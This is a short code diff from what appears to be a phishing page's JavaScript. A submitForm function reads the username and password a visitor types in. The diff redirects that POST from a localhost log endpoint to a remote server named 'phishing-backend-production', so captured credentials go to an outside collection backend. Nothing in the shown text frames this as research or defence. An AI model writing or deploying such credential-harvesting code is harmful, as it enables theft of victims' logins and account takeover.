@@ -320,7 +320,7 @@ function submitForm() {
   const username = document.getElementById('username').value || '(ცარიელი)';
   const password = document.getElementById('password').value || '(ცარიელი)';
 
-  fetch("https://localhost:7011/api/log", {
+  fetch("https://phishing-backend-production-f1aa.up.railway.app/api/log", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
